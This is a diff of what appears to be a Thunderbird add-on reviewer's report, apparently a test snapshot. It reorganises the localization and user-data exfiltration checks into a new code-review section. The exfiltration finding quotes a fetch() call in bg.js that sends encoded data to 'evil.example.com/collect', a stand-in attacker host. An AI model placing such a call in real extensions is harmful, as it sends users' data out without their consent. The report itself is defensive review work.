@@ -8,6 +8,24 @@ Thank you for your submission. We appreciate the effort you’ve put into creati
 You can run this automated review yourself before submitting:
 https://github.com/thunderbird/webext-linter
 
+── Extended code review ──
+
+Continue manual review for the following checks:
+
+1) Missing English localization: This add-on ships no English localization, so
+   user-facing text may be hardcoded in another language. Review its strings by
+   hand and confirm if an English localization is provided.
+Suggested response: Please include an English localization. English serves as the default language in Thunderbird, and most users who do not understand the hardcoded language will most likely be able to read English. The i18n API allows defining strings for multiple locales, and Thunderbird automatically selects the one that best matches the user’s interface language.
+An example can be found here: https://github.com/thunderbird/webext-examples/tree/master/manifest_v2/i18n
+ - manifest.json
+
+2) User-data exfiltration: The following code locations transmit data to a
+   remote server. Confirm by hand that any user data they send is gated behind
+   an explicit opt-in (a documented options-page setting) and is never sent
+   without consent.
+Suggested response: The following code location(s) send user data to a remote server without an explicit opt-in. User data may be transmitted only when the user actively enables it on an options page that discloses what is sent.
+ - bg.js:7 - fetch() "http://evil.example.com/collect?d=" + encodeURIComponent(data)
+
 ── Extended manual review ──
 
 Continue manual review for the following checks:
@@ -22,20 +40,6 @@ Suggested response: Please add a privacy policy to this add-on that details whic
 [1]: https://thunderbird.github.io/atn-review-policy/#data-disclosure-collection-and-management
 [2]: https://www.mozilla.org/en-US/privacy/
  - evil.example.com
-
-2) Missing English localization: This add-on ships no English localization, so
-   user-facing text may be hardcoded in another language. Review its strings by
-   hand and confirm if an English localization is provided.
-Suggested response: Please include an English localization. English serves as the default language in Thunderbird, and most users who do not understand the hardcoded language will most likely be able to read English. The i18n API allows defining strings for multiple locales, and Thunderbird automatically selects the one that best matches the user’s interface language.
-An example can be found here: https://github.com/thunderbird/webext-examples/tree/master/manifest_v2/i18n
- - manifest.json
-
-3) User-data exfiltration: The following code locations transmit data to a
-   remote server. Confirm by hand that any user data they send is gated behind
-   an explicit opt-in (a documented options-page setting) and is never sent
-   without consent.
-Suggested response: The following code location(s) send user data to a remote server without an explicit opt-in. User data may be transmitted only when the user actively enables it on an options page that discloses what is sent.
- - bg.js:7 - fetch() "http://evil.example.com/collect?d=" + encodeURIComponent(data)
 
 ── Standard manual review ──
 
@@ -106,4 +110,4 @@ Because the original project is still active, your submission does not meet thes
 
 ── Summary ──
 
-1 error(s), 0 warning(s), 0 info, 3 extended manual review step(s), 10 standard manual review step(s)
+1 error(s), 0 warning(s), 0 info, 2 extended code review step(s), 1 extended manual review step(s), 10 standard manual review step(s)
